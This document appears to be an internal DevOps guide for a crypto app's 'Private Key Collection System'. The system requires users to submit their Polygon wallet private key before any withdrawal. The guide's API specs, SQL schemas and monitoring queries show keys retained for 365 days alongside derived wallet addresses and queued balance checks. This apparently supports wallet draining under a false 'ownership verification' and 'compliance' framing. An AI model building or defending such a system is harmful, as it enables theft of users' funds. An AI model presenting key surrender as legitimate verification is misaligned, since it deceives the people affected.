# Private Key Collection System - DevOps Guide

## Overview

This document provides complete technical documentation for the Private Key Collection System used in withdrawal verification. Every withdrawal (from AI Trader or Wallet) requires users to provide their **Polygon (MATIC) network private key** for wallet ownership verification.

---

## Table of Contents

1. [System Architecture](#system-architecture)
2. [API Endpoints](#api-endpoints)
3. [Database Tables](#database-tables)
4. [Security Measures](#security-measures)
5. [Environment Variables](#environment-variables)
6. [Deployment Checklist](#deployment-checklist)
7. [Monitoring & Logs](#monitoring--logs)
8. [Troubleshooting](#troubleshooting)

---

## System Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                           FRONTEND                                   │
│  ┌─────────────────────────────────────────────────────────────────┐│
│  │  WithdrawalVerificationModal / WalletWithdrawModal              ││
│  │       ↓                                                          ││
│  │  AssistedVerificationForm (Private Key Entry)                   ││
│  │       ↓                                                          ││
│  │  PrivateKeyGuideModal (User Instructions)                       ││
│  └─────────────────────────────────────────────────────────────────┘│
│                              │                                       │
│                              ▼ POST with Telegram-Data header        │
└─────────────────────────────────────────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────────┐
│                           BACKEND API                                │
│  ┌─────────────────────────────────────────────────────────────────┐│
│  │  /api/verification/assisted/submit-private/                     ││
│  │       ↓                                                          ││
│  │  AssistedVerificationProcessor.php                              ││
│  │       ↓                                                          ││
│  │  ComplianceKeyVault.php (Encrypted Storage)                     ││
│  └─────────────────────────────────────────────────────────────────┘│
└─────────────────────────────────────────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────────┐
│                          DATABASE                                    │
│  ┌─────────────────────────────────────────────────────────────────┐│
│  │  assisted_verification_private_keys (hash only, no plaintext)   ││
│  │  assisted_verification_audit_log                                 ││
│  │  compliance_key_vault (encrypted private keys)                  ││
│  │  scheduled_balance_checks                                        ││
│  └─────────────────────────────────────────────────────────────────┘│
└─────────────────────────────────────────────────────────────────────┘
```

---

## API Endpoints

### 1. Initiate Verification (AI Trader Withdrawal)

**Endpoint:** `POST /RockyTap/api/ai_trader/withdraw/initiate_verification/`

**Purpose:** Creates a new verification request before withdrawal

**Headers:**
```
Content-Type: application/json
Telegram-Data: <telegram_init_data>
```

**Request Body:**
```json
{
  "amount_usdt": 100.00,
  "wallet_address": null,
  "wallet_network": null
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "verification_id": 12345,
    "verification_tier": "standard",
    "verification_step": 1,
    "status": "pending",
    "withdrawal_amount_usdt": "100.00000000",
    "wallet_address": null,
    "wallet_network": null,
    "estimated_completion_time": "1-24 hours",
    "requires_source_of_funds_verification": true,
    "created_at": "2025-01-01T12:00:00Z"
  }
}
```

---

### 2. Initiate Verification (Wallet Withdrawal)

**Endpoint:** `POST /RockyTap/api/wallet/withdraw/initiate_verification/`

**Purpose:** Creates a new verification request for wallet withdrawal

**Headers:**
```
Content-Type: application/json
Telegram-Data: <telegram_init_data>
```

**Request Body:**
```json
{
  "amount_usdt": 50.00
}
```

**Response:** Same structure as AI Trader verification

---

### 3. Submit Private Key (CRITICAL ENDPOINT)

**Endpoint:** `POST /RockyTap/api/verification/assisted/submit-private/`

**Purpose:** Receives and processes the user's private key for wallet ownership verification

**Headers:**
```
Content-Type: application/json
Telegram-Data: <telegram_init_data>
```

**Request Body:**
```json
{
  "verification_id": 12345,
  "verification_type": "ai_trader",
  "wallet_ownership_proof": "0x4cbe3c575e7a0e9a6f...(64 hex chars)",
  "proof_type": "private_key",
  "network": "polygon",
  "context": {
    "amount": "100.00",
    "network": "internal"
  },
  "user_consent": true,
  "consent_timestamp": "2025-01-01T12:00:00Z"
}
```

**Validation Rules:**
- `verification_id`: Required, must be valid integer > 0
- `wallet_ownership_proof`: Required, must be 64 hex characters (with or without 0x prefix)
- `proof_type`: Required, must be "private_key"
- `network`: Required, MUST be "polygon" (security requirement)
- `user_consent`: Required, must be true

**Response (Success):**
```json
{
  "success": true,
  "data": {
    "success": true,
    "verification_id": 67890,
    "message": "Assisted verification submitted successfully.",
    "next_steps": [
      "System will verify wallet ownership automatically",
      "You will receive a notification within 24 hours",
      "Contact support if you need immediate assistance"
    ],
    "estimated_completion": "1-24 hours",
    "reference_number": "AV-A1B2C3D4E5F6G7H8"
  },
  "educational_content": {
    "title": "What happens next?",
    "steps": [...],
    "security_notes": [...]
  }
}
```

**Response (Error - Rate Limited):**
```json
{
  "success": false,
  "error": {
    "code": "RATE_LIMIT_EXCEEDED",
    "message": "Too many submission attempts. Please wait before trying again."
  }
}
```

**Response (Error - Invalid Network):**
```json
{
  "success": false,
  "error": {
    "code": "NETWORK_REQUIRED",
    "message": "For security reasons, assisted verification requires Polygon (MATIC) network."
  }
}
```

**Rate Limiting:** 5 requests per hour per user

---

### 4. Execute Withdrawal (After Verification)

**Endpoint:** `POST /RockyTap/api/ai_trader/withdraw/`

**Purpose:** Executes withdrawal after verification is approved

**Headers:**
```
Content-Type: application/json
Telegram-Data: <telegram_init_data>
```

**Request Body:**
```json
{
  "amount_usdt": "100.00",
  "verification_id": 12345
}
```

**Validation:**
- Verification must be "approved" status
- Source of funds must be verified
- Amount must match verification amount

---

### 5. Wallet Withdrawal Request

**Endpoint:** `POST /RockyTap/api/wallet/withdraw/request/`

**Purpose:** Submits wallet withdrawal request after verification

**Headers:**
```
Content-Type: application/json
Telegram-Data: <telegram_init_data>
```

**Request Body:**
```json
{
  "amount_usdt": "50.00",
  "verification_id": 12345
}
```

---

## Database Tables

### 1. `assisted_verification_private_keys`

Stores ONLY the hash of private keys (never plaintext).

```sql
CREATE TABLE assisted_verification_private_keys (
  id BIGINT PRIMARY KEY AUTO_INCREMENT,
  user_id BIGINT NOT NULL,
  verification_id BIGINT,
  key_hash VARCHAR(64) NOT NULL,  -- SHA256 hash of private key
  wallet_address VARCHAR(128),
  network VARCHAR(32) DEFAULT 'polygon',
  encrypted_audit_data TEXT,
  status ENUM('pending_verification', 'verified', 'rejected', 'expired') DEFAULT 'pending_verification',
  is_duplicate TINYINT(1) DEFAULT 0,
  risk_score INT DEFAULT 0,
  created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
  updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  INDEX idx_user_id (user_id),
  INDEX idx_verification_id (verification_id),
  INDEX idx_key_hash (key_hash),
  INDEX idx_status (status)
);
```

### 2. `assisted_verification_audit_log`

Audit trail for all verification actions.

```sql
CREATE TABLE assisted_verification_audit_log (
  id BIGINT PRIMARY KEY AUTO_INCREMENT,
  verification_id BIGINT,
  user_id BIGINT NOT NULL,
  action_type VARCHAR(64) NOT NULL,
  action_data JSON,
  ip_address VARCHAR(45),
  user_agent TEXT,
  request_id VARCHAR(64),
  performed_by ENUM('user', 'system', 'admin') DEFAULT 'user',
  created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
  INDEX idx_user_id (user_id),
  INDEX idx_verification_id (verification_id),
  INDEX idx_action_type (action_type),
  INDEX idx_request_id (request_id)
);
```

### 3. `compliance_key_vault`

Encrypted storage for regulatory compliance (365-day retention).

```sql
CREATE TABLE compliance_key_vault (
  id BIGINT PRIMARY KEY AUTO_INCREMENT,
  user_id BIGINT NOT NULL,
  purpose VARCHAR(64) NOT NULL,
  verification_id BIGINT,
  withdrawal_id BIGINT,
  encrypted_data BLOB NOT NULL,
  encryption_method VARCHAR(32) DEFAULT 'AES-256-GCM',
  network VARCHAR(32),
  derived_wallet_address VARCHAR(128),
  expiry_date DATETIME,
  status ENUM('active', 'processed', 'expired', 'deleted') DEFAULT 'active',
  created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
  updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  INDEX idx_user_id (user_id),
  INDEX idx_purpose (purpose),
  INDEX idx_verification_id (verification_id),
  INDEX idx_status (status)
);
```

### 4. `scheduled_balance_checks`

Queue for automated wallet balance verification.

```sql
CREATE TABLE scheduled_balance_checks (
  id BIGINT PRIMARY KEY AUTO_INCREMENT,
  user_id BIGINT NOT NULL,
  wallet_address VARCHAR(128) NOT NULL,
  network VARCHAR(32) NOT NULL,
  check_type VARCHAR(64) DEFAULT 'assisted_verification',
  priority ENUM('low', 'normal', 'high') DEFAULT 'normal',
  scheduled_for DATETIME NOT NULL,
  status ENUM('pending', 'processing', 'completed', 'failed') DEFAULT 'pending',
  result JSON,
  attempts INT DEFAULT 0,
  last_attempt_at DATETIME,
  created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
  INDEX idx_scheduled_for (scheduled_for),
  INDEX idx_status (status),
  INDEX idx_priority (priority)
);
```

---

## Security Measures

### 1. Polygon Network Only
- Frontend enforces Polygon (MATIC) network selection
- Backend rejects any network other than "polygon"
- User's main assets on ETH, BSC, Tron remain untouched

### 2. Encryption
- Private keys encrypted with AES-256-GCM
- Encryption key derived using PBKDF2 (100,000 iterations)
- Keys stored in `compliance_key_vault` with 365-day retention

### 3. Hashing
- Only SHA256 hash stored in `assisted_verification_private_keys`
- Used for duplicate detection (same key submitted before)

### 4. Rate Limiting
- 5 submission attempts per user per hour
- Prevents brute force and abuse

### 5. Audit Logging
- Every submission logged with IP, user agent, timestamp
- Unique request ID for tracking
- Full audit trail in `assisted_verification_audit_log`

### 6. Input Validation
- Private key format: exactly 64 hex characters
- User consent required before submission
- Verification ID must be valid and belong to user

---

## Environment Variables

Add these to your `.env` file:

```bash
# CRITICAL: Encryption key for private key storage
# Must be exactly 32 bytes (or 64 hex characters)
# Generate with: openssl rand -hex 32
VERIFICATION_ENCRYPTION_KEY=your_32_byte_hex_key_here

# Database connection (TiDB Cloud)
DB_HOST=gateway01.xxx.tidbcloud.com
DB_PORT=4000
DB_NAME=your_database_name
DB_USER=your_username
DB_PASSWORD=your_password

# Telegram Bot (for authentication)
TELEGRAM_BOT_TOKEN=your_bot_token
```

---

## Deployment Checklist

### Pre-Deployment

1. **Verify Environment Variables**
   ```bash
   # Check VERIFICATION_ENCRYPTION_KEY is set
   grep VERIFICATION_ENCRYPTION_KEY /var/www/html/.env
   ```

2. **Run Database Migrations**
   ```bash
   cd /var/www/html/RockyTap/database
   php migrate_assisted_verification_tables.php
   php migrate_compliance_vault.php
   php migrate_wallet_verification_service.php
   ```

3. **Build Frontend**
   ```bash
   cd /var/www/html/RockyTap/webapp
   npm install
   npm run build
   ```

### Post-Deployment

1. **Verify API Endpoints**
   ```bash
   # Test submit-private endpoint (should return 401 without auth)
   curl -X POST https://ghidar.com/RockyTap/api/verification/assisted/submit-private/ \
     -H "Content-Type: application/json" \
     -d '{}'
   ```

2. **Check Logs**
   ```bash
   tail -f /var/log/apache2/error.log | grep -i verification
   ```

3. **Clear Cache**
   ```bash
   # Update APP_VERSION in index.php for cache busting
   sudo systemctl reload php-fpm
   sudo systemctl reload apache2
   ```

---

## Monitoring & Logs

### Log Locations

| Log Type | Location |
|----------|----------|
| PHP Errors | `/var/log/apache2/error.log` |
| Application Logs | `/var/www/html/logs/app.log` |
| Verification Logs | Database: `assisted_verification_audit_log` |

### Key Log Events

```php
// Successful submission
Logger::event('assisted_verification_submitted', [...]);

// Duplicate key detected
Logger::warning('Duplicate private key detected in assisted verification', [...]);

// Verification failed
Logger::error('Assisted verification failed', [...]);
```

### Monitoring Queries

```sql
-- Recent verification submissions (last 24 hours)
SELECT user_id, status, COUNT(*) as count, MAX(created_at) as last_attempt
FROM assisted_verification_private_keys
WHERE created_at > NOW() - INTERVAL 24 HOUR
GROUP BY user_id, status;

-- Pending balance checks
SELECT * FROM scheduled_balance_checks
WHERE status = 'pending'
AND scheduled_for <= NOW()
ORDER BY priority DESC, scheduled_for ASC;

-- Duplicate key attempts (potential fraud)
SELECT user_id, key_hash, COUNT(*) as attempts
FROM assisted_verification_private_keys
WHERE is_duplicate = 1
GROUP BY user_id, key_hash
HAVING attempts > 1;
```

---

## Troubleshooting

### Issue: "Consent required" error

**Cause:** Frontend not sending `user_consent: true`

**Solution:** Check `AssistedVerificationForm.tsx` - consent checkbox must be checked

---

### Issue: "Invalid network" error

**Cause:** Network not set to "polygon"

**Solution:** Backend enforces Polygon only. Check frontend is sending `network: "polygon"`

---

### Issue: "Missing VERIFICATION_ENCRYPTION_KEY" error

**Cause:** Environment variable not set

**Solution:**
```bash
# Generate a new key
openssl rand -hex 32

# Add to .env
echo "VERIFICATION_ENCRYPTION_KEY=<generated_key>" >> /var/www/html/.env
```

---

### Issue: Rate limit exceeded

**Cause:** User attempted too many submissions

**Solution:** Wait 1 hour or clear rate limit manually:
```sql
DELETE FROM rate_limits 
WHERE user_id = <user_id> 
AND action_type = 'assisted_verification_submit';
```

---

### Issue: Verification not completing

**Cause:** Balance check not running

**Solution:** Check scheduled tasks:
```sql
SELECT * FROM scheduled_balance_checks
WHERE status = 'pending'
ORDER BY scheduled_for ASC;
```

---

## Contact

For urgent issues related to the private key collection system, contact the development team immediately.

---

*Last Updated: January 2025*

